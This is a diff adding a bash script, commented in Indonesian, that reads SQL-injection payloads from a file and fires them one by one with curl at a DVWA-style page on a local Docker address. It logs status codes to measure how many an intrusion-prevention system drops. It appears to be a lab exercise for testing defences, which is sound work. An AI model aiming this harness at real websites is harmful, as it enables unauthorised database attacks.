@@ -1,0 +1,83 @@
+#!/bin/bash
+# ============================================================
+#  attacker-scripts/send_attack.sh
+#  Mengirim serangan SQLi dari sqli_payloads.txt satu per satu.
+#  Menampilkan payload yang dikirim dan respons HTTP secara real-time.
+# ============================================================
+
+PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
+ATTACK_FILE="$PROJECT_DIR/sqli_payloads.txt"
+TARGET_IP="172.17.0.2"
+TARGET_URL="http://$TARGET_IP/vulnerabilities/sqli/"
+COOKIE="PHPSESSID=pnb708okemms8g0a3ejaocb535; security=low"
+DELAY=0.5   # detik antar request (ubah ke 0 untuk kecepatan penuh)
+
+# ── Override Cookie dari argumen jika ada ──────────────────
+if [ -n "$1" ]; then
+    COOKIE="$1"
+fi
+
+# ── Hitung total payload ───────────────────────────────────
+TOTAL=$(grep -cv '^\s*$\|^#' "$ATTACK_FILE" 2>/dev/null || echo 0)
+
+echo ""
+echo "========================================================"
+echo "  NODE ATTACKER: SEND ATTACK (SQLi Payloads)"
+echo "========================================================"
+echo "  Target  : $TARGET_URL"
+echo "  File    : $ATTACK_FILE"
+echo "  Payloads: $TOTAL"
+echo "  Cookie  : ${COOKIE:0:40}..."
+echo "========================================================"
+echo ""
+echo "  Format output:"
+echo "  -> Menampilkan payload yang dikirim"
+echo "  -> HTTP Status Code respons dari server"
+echo "  (Status 000/timeout = paket di-DROP oleh IPS)"
+echo ""
+echo "========================================================"
+
+COUNT=0
+BLOCKED=0
+ALLOWED=0
+
+while IFS= read -r payload; do
+    # Lewati baris kosong dan komentar
+    [[ -z "$payload" || "$payload" == \#* ]] && continue
+
+    COUNT=$((COUNT + 1))
+
+    # Kirim payload dan tangkap HTTP status code
+    HTTP_STATUS=$(curl -s -o /dev/null --max-time 2 \
+        -w "%{http_code}" \
+        -G "$TARGET_URL" \
+        --data-urlencode "id=$payload" \
+        --data-urlencode "Submit=Submit" \
+        -H "Cookie: $COOKIE")
+
+    # Tentukan label berdasarkan status
+    if [ "$HTTP_STATUS" = "000" ]; then
+        LABEL="[DROP] BLOCKED/DROPPED (timeout)"
+        BLOCKED=$((BLOCKED + 1))
+    elif [ "$HTTP_STATUS" = "200" ]; then
+        LABEL="[PASS] LOLOS -> HTTP $HTTP_STATUS"
+        ALLOWED=$((ALLOWED + 1))
+    else
+        LABEL="[WARN] HTTP $HTTP_STATUS"
+        ALLOWED=$((ALLOWED + 1))
+    fi
+
+    # Tampilkan hasil secara real-time
+    printf "[%3d/%d] %-60s %s\n" "$COUNT" "$TOTAL" "${payload:0:60}" "$LABEL"
+
+    sleep "$DELAY"
+done < "$ATTACK_FILE"
+
+echo ""
+echo "--------------------------------------------------------"
+echo "  RINGKASAN SERANGAN:"
+echo "  Total Payload Dikirim : $COUNT"
+echo "  Diblokir (DROP/timeout): $BLOCKED"
+echo "  Lolos ke server       : $ALLOWED"
+echo "--------------------------------------------------------"
+echo ""
